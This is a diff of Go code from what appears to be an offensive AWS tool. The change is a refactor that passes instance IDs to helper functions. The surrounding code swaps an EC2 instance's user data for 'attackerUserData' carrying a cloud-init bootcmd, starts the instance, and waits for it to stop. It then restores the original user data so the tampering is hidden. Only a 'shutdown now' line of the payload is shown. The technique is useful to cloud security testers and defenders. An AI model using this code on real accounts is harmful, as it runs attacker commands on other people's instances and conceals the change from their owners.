@@ -46,9 +46,9 @@ bootcmd:
 - shutdown now
 `
 
-	ModifyUserData(ctx, instance, attackerUserData)
+	ModifyUserData(ctx, instance.InstanceId, attackerUserData)
 	fmt.Printf("[INFO] Starting instance %s\n", instance.InstanceId)
-	StartInstance(ctx, instance)
+	StartInstance(ctx, instance.InstanceId)
 
 	// Shutdown is handled in the bootcmd, this makes sure we don't modify the userData back to the original
 	// before our userData runs. We can't simply wait for a running state because the cloud-init data may have not
@@ -56,8 +56,8 @@ bootcmd:
 	WaitForInstance(ctx, instance.InstanceId, types.InstanceStateNamePending)
 	WaitForInstance(ctx, instance.InstanceId, types.InstanceStateNameStopped)
 
-	ModifyUserData(ctx, instance, originalUserData.Value)
-	StartInstance(ctx, instance)
+	ModifyUserData(ctx, instance.InstanceId, originalUserData.Value)
+	StartInstance(ctx, instance.InstanceId)
 }
 
 func main() {
